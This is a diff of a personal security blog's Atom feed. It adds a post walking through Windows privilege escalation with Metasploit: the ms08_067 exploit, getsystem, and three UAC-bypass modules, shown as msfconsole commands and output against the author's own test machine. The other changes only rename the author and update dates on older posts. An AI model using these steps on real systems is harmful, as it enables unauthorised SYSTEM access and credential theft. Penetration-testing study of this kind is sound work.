@@ -1,4 +1,163 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.4.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-05-06T13:57:33+00:00</updated><id>http://localhost:4000/</id><title type="html">./codemuch</title><entry><title type="html">Dynamic Memory and Pointers in C</title><link href="http://localhost:4000/2017/04/15/memory-pointers-c.html" rel="alternate" type="text/html" title="Dynamic Memory and Pointers in C" /><published>2017-04-15T00:00:00+00:00</published><updated>2017-04-15T00:00:00+00:00</updated><id>http://localhost:4000/2017/04/15/memory-pointers-c</id><content type="html" xml:base="http://localhost:4000/2017/04/15/memory-pointers-c.html">&lt;p&gt;If you are like me, you love to throw pointer lexicons throughout your code hoping to make all those compiler warnings go away. I mean, you might understand what pointers are, but you don’t really &lt;em&gt;understand&lt;/em&gt; them.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.4.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-05-15T00:47:25+00:00</updated><id>http://localhost:4000/</id><title type="html">./codemuch</title><entry><title type="html">Privilege Escalation in Windows</title><link href="http://localhost:4000/2017/05/14/priv-esc-win.html" rel="alternate" type="text/html" title="Privilege Escalation in Windows" /><published>2017-05-14T00:00:00+00:00</published><updated>2017-05-14T00:00:00+00:00</updated><id>http://localhost:4000/2017/05/14/priv-esc-win</id><content type="html" xml:base="http://localhost:4000/2017/05/14/priv-esc-win.html">&lt;p&gt;Dusting off &lt;code class=&quot;highlighter-rouge&quot;&gt;msfconsole&lt;/code&gt; and the Metasploit framework itself, it was time for me to get back on my feet with penetration testing.&lt;/p&gt;
+
+&lt;p&gt;With the recent ransomware &lt;a href=&quot;http://www.cnn.com/2017/05/14/opinions/wannacrypt-attack-should-make-us-wanna-cry-about-vulnerability-urbelis/&quot;&gt;WannaCry&lt;/a&gt; spreading throughout the globe, I pondered upon the question on how malware is able to attain system-level privileges on a Windows machine, locking it down, and making it near-impossible to circumvent.&lt;/p&gt;
+
+&lt;p&gt;When utilizing Metasploit against Windows targets, its essential to escalate user privileges to &lt;strong&gt;SYSTEM&lt;/strong&gt;, otherwise being stuck on a user account with regular permissions limit the pentest. As penetration testers, privilege escalation is considered the most critical point of the post-exploitation step, and all the hard work from gaining initial access, maintaining persistence and circumventing the anti-virus will all seem meaningless.&lt;/p&gt;
+
+&lt;p&gt;What are some fun things we can do once we attain &lt;strong&gt;SYSTEM&lt;/strong&gt;?&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Attain passwords, including hashes for any accounts on the system (‘hashdump’)&lt;/li&gt;
+  &lt;li&gt;Change passwords, create users and change permissions (even administration)&lt;/li&gt;
+  &lt;li&gt;Pivot to other workstations&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;A lot of the higher system-level functions of Metasploit rely on gaining system. Many penetration testers work immediately at privilege escalation once the machine is pwn`ed.&lt;/p&gt;
+
+&lt;p&gt;Metasploit’s &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; console comes with some built-in Ruby scripts that can already help with the process.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit(ms08_067_netapi) &amp;gt; exploit
+...
+meterpreter &amp;gt; getsystem
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;In this case, I utilized the built in &lt;code class=&quot;highlighter-rouge&quot;&gt;getsystem&lt;/code&gt; script. Well, what &lt;strong&gt;exactly&lt;/strong&gt; does &lt;code class=&quot;highlighter-rouge&quot;&gt;getsystem&lt;/code&gt; do? &lt;code class=&quot;highlighter-rouge&quot;&gt;getsystem&lt;/code&gt; works on three different techniques. Although I won’t go in detail about how they work, Cobalt Strike (a Metasploit GUI framework) wrote a &lt;a href=&quot;https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/&quot;&gt;great blog post&lt;/a&gt; about it.&lt;/p&gt;
+
+&lt;p&gt;This exploit, CVE-2008-4250, is one of the staples of vulnerabilities in the early Windows XP operating systems. Yes, Windows &lt;strong&gt;XP&lt;/strong&gt;. What happens if we attempt to gain privileges on a pwn’ed Windows 8 or 10 machine?&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit(handler) &amp;gt; exploit
+...
+meterpreter &amp;gt; getsystem
+[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:
+[-] Named Pipe Impersonation (In Memory/Admin)
+[-] Named Pipe Impersonation (Dropper/Admin)
+[-] Token Duplication (In Memory/Admin)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Using a standard Veil-Evasion encrypted Meterpreter payload binary, I gained physical access inside my test Windows 10 machine. Not as fun as fileless access, but gets the work done. However, when we attempt to utilize &lt;code class=&quot;highlighter-rouge&quot;&gt;getsystem&lt;/code&gt; this time, all three methods of it ceased to work. Even doing &lt;code class=&quot;highlighter-rouge&quot;&gt;getprivs&lt;/code&gt; doesn’t yield us that many permissions.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; getprivs
+============================================================
+Enabled Process Privileges
+============================================================
+SeShutdownPrivilege
+SeChangeNotifyPrivilege
+SeUndockPrivilege
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;And keep in mind that this is a standard Windows 10 machine WITHOUT any AVs except for the standard Windows Defender. So, what happened?&lt;/p&gt;
+
+&lt;h2 id=&quot;user-account-control&quot;&gt;User Account Control&lt;/h2&gt;
+
+&lt;p&gt;Now’s a great time to talk about Window’s UAC, or User Account Control feature. This feature was implemented as a security feature such that hackers are not able to gain privileges. This means that in order for a regular user to utilize some sort of service of application that is available exclusively to the administrator, a popup prompt will pop out requesting authentication as a Administrator. Sounds familiar? You definitely has seen UAC before, with all its warnings about unknown publishers for some applications, turning off certain features in the Windows settings, etc.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://bit.ly/2qGTpjE&quot; alt=&quot;uac&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;On Windows 10, UAC has become much more stricter, such that impersonating SYSTEM with &lt;code class=&quot;highlighter-rouge&quot;&gt;getsystem&lt;/code&gt; becomes much harder … but not impossible.&lt;/p&gt;
+
+&lt;h2 id=&quot;a-few-methods-to-bypass-uac&quot;&gt;A Few Methods to Bypass UAC&lt;/h2&gt;
+
+&lt;p&gt;In order to circumvent this, we need to rely on some different techniques.&lt;/p&gt;
+
+&lt;h3 id=&quot;windows-escalate-uac-protection-bypass&quot;&gt;Windows Escalate UAC Protection Bypass&lt;/h3&gt;
+
+&lt;p&gt;This is a method which spawns a new shell session with UAC disabled as a process. This attack works, however, on the basis that UAC is set as “Notify me only when programs try to make changes to my computer”, which is standard for many operating systems.&lt;/p&gt;
+
+&lt;p&gt;Let’s background our current &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; session and load it up.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; background
+[*] Backgrounding session 2...
+msf(handler) &amp;gt; use exploit/windows/local/bypassuac
+msf(bypassuac) &amp;gt; show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+   1   Windows x64
+
+msf(bypassuac) &amp;gt; set TARGET 1
+TARGET =&amp;gt; 1
+msf(bypassuac) &amp;gt; set SESSION 2
+SESSION =&amp;gt; 2
+msf(bypassuac) &amp;gt; exploit
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Once complete, we are able to &lt;code class=&quot;highlighter-rouge&quot;&gt;getsystem&lt;/code&gt; as we did previously.&lt;/p&gt;
+
+&lt;p&gt;Of course, this may not totally work. If UAC is set to “Always Notify”, loading this process as part of memory will fail. Therefore, if you use a build of Windows that is Vista it will not work, as this is feature is default. In this case, the attack against my Windows 10 build failed&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit(bypassuac) &amp;gt; exploit
+
+[*] Started reverse TCP handler on 192.168.1.170:4444 
+[-] Exploit aborted due to failure: not-vulnerable: Windows 10 (Build 14393). is not vulnerable.
+[*] Exploit completed, but no session was created.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;windows-escalate-uac-protection-bypass-in-memory-injection&quot;&gt;Windows Escalate UAC Protection Bypass (In Memory Injection)&lt;/h3&gt;
+
+&lt;p&gt;This exploit aims to to inject a DLL binary through the Reflective DLL Injection technique. Similar to the previous exploit, it is important to specify the architecture of the machine.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; background
+[*] Backgrounding session 2...
+msf(handler) &amp;gt; use exploit/windows/local/bypassuac_injection
+msf(bypassuac_injection) &amp;gt; show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+   1   Windows x64
+
+msf(bypassuac_injection) &amp;gt; set TARGET 0
+TARGET =&amp;gt; 0
+msf(bypassuac_injection) &amp;gt; set SESSION 2
+SESSION =&amp;gt; 2
+msf(bypassuac_injection) &amp;gt; exploit
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;windows-escalate-uac-execute-runas&quot;&gt;Windows Escalate UAC Execute RunAs&lt;/h3&gt;
+
+&lt;p&gt;This last exploit was actually from &lt;a href=&quot;https://www.youtube.com/watch?v=OqmxRIqC3FE&amp;amp;feature=youtu.be&quot;&gt;this Metasploitation video&lt;/a&gt; and was conceived by Hak5’s &lt;a href=&quot;https://room362.com/&quot;&gt;mubix&lt;/a&gt;. I find this privilege escalation method the most effective, but it does add on a caveat of the target user having to explicitly click on a UAC notification. This exploit calls upon the Windows &lt;code class=&quot;highlighter-rouge&quot;&gt;ShellExecute&lt;/code&gt; function to start a shell with UAC-bypassed privileges. Once again, it is important that you set the necessary target architecture.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; background
+[*] Backgrounding session 2...
+msf(handler) &amp;gt; use exploit/windows/local/ask
+msf(ask) &amp;gt; show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+   1   Windows x64
+
+msf(ask) &amp;gt; set TARGET 0
+TARGET =&amp;gt; 0
+msf(ask) &amp;gt; set SESSION 2
+SESSION =&amp;gt; 2
+msf(ask) &amp;gt; exploit
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Once executed, UAC will give a prompt to a user. Once completed, the exploit finishes, and you are able to &lt;code class=&quot;highlighter-rouge&quot;&gt;getsystem&lt;/code&gt;.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;Thanks for reading this article! Although I had fun getting my feet wet with Metasploit again, I still am reminded about how uninformed I am about the Win API, and really want to dive into binary exploitation, as well as acquainting myself with the Windows architecture for security-oriented purposes. With that said, expect some more fun stuff in the future combining both penetration testing and programming!&lt;/p&gt;
+
+&lt;p&gt;With that said, stay safe and good luck with your endeavors!&lt;/p&gt;</content><author><name>Alan</name></author><summary type="html">Dusting off msfconsole and the Metasploit framework itself, it was time for me to get back on my feet with penetration testing.</summary></entry><entry><title type="html">Dynamic Memory and Pointers in C</title><link href="http://localhost:4000/2017/04/15/memory-pointers-c.html" rel="alternate" type="text/html" title="Dynamic Memory and Pointers in C" /><published>2017-04-15T00:00:00+00:00</published><updated>2017-04-15T00:00:00+00:00</updated><id>http://localhost:4000/2017/04/15/memory-pointers-c</id><content type="html" xml:base="http://localhost:4000/2017/04/15/memory-pointers-c.html">&lt;p&gt;If you are like me, you love to throw pointer lexicons throughout your code hoping to make all those compiler warnings go away. I mean, you might understand what pointers are, but you don’t really &lt;em&gt;understand&lt;/em&gt; them.&lt;/p&gt;
 
 &lt;p&gt;Here’s a nice rundown of how a pointer works, on a “high” level:&lt;/p&gt;
 
@@ -153,7 +312,7 @@ if (array == NULL) {
 
 &lt;p&gt;So that’s a litle bit of a rundown on pointers, static and dynamic memory, and dynamic memory allocation in C.&lt;/p&gt;
 
-&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>ex0dus</name></author><summary type="html">If you are like me, you love to throw pointer lexicons throughout your code hoping to make all those compiler warnings go away. I mean, you might understand what pointers are, but you don’t really understand them.</summary></entry><entry><title type="html">Python for Security</title><link href="http://localhost:4000/2017/04/08/python-for-security.html" rel="alternate" type="text/html" title="Python for Security" /><published>2017-04-08T00:00:00+00:00</published><updated>2017-04-08T00:00:00+00:00</updated><id>http://localhost:4000/2017/04/08/python-for-security</id><content type="html" xml:base="http://localhost:4000/2017/04/08/python-for-security.html">&lt;p&gt;Python is one of the greatest programming languages for hackers. Not because of its easiness actually, but it is &lt;strong&gt;beginner-friendly&lt;/strong&gt; and &lt;strong&gt;fast to deploy&lt;/strong&gt;. One of the best thing about the language is the resemblance to that of a natural language, sharing syntactical and semantical rules that very much look like English.&lt;/p&gt;
+&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Alan</name></author><summary type="html">If you are like me, you love to throw pointer lexicons throughout your code hoping to make all those compiler warnings go away. I mean, you might understand what pointers are, but you don’t really understand them.</summary></entry><entry><title type="html">Python for Security</title><link href="http://localhost:4000/2017/04/08/python-for-security.html" rel="alternate" type="text/html" title="Python for Security" /><published>2017-04-08T00:00:00+00:00</published><updated>2017-04-08T00:00:00+00:00</updated><id>http://localhost:4000/2017/04/08/python-for-security</id><content type="html" xml:base="http://localhost:4000/2017/04/08/python-for-security.html">&lt;p&gt;Python is one of the greatest programming languages for hackers. Not because of its easiness actually, but it is &lt;strong&gt;beginner-friendly&lt;/strong&gt; and &lt;strong&gt;fast to deploy&lt;/strong&gt;. One of the best thing about the language is the resemblance to that of a natural language, sharing syntactical and semantical rules that very much look like English.&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;for i in range(0, 50):
   print &quot;Hello&quot;
@@ -345,4 +504,4 @@ gi.org_by_addr(ip) #=&amp;gt; &quot;Super Techcom ISP Inc. Corp.&quot;
   &lt;li&gt;&lt;a href=&quot;https://repo.zenk-security.com/Programmation/Violent%20Python%20a%20Cookbook%20for%20Hackers-Forensic%20Analysts-Penetration%20testers%20and%20Security%20Engineers.pdf&quot;&gt;&lt;strong&gt;Violent Python&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;and of course, if you are a beginner YEARNING to learn, here’s a great classic:
  &lt;a href=&quot;https://automatetheboringstuff.com/&quot;&gt;&lt;strong&gt;Automate the Boring Stuff with Python&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>ex0dus</name></author><summary type="html">Python is one of the greatest programming languages for hackers. Not because of its easiness actually, but it is beginner-friendly and fast to deploy. One of the best thing about the language is the resemblance to that of a natural language, sharing syntactical and semantical rules that very much look like English.</summary></entry></feed>
+&lt;/ul&gt;</content><author><name>Alan</name></author><summary type="html">Python is one of the greatest programming languages for hackers. Not because of its easiness actually, but it is beginner-friendly and fast to deploy. One of the best thing about the language is the resemblance to that of a natural language, sharing syntactical and semantical rules that very much look like English.</summary></entry></feed>
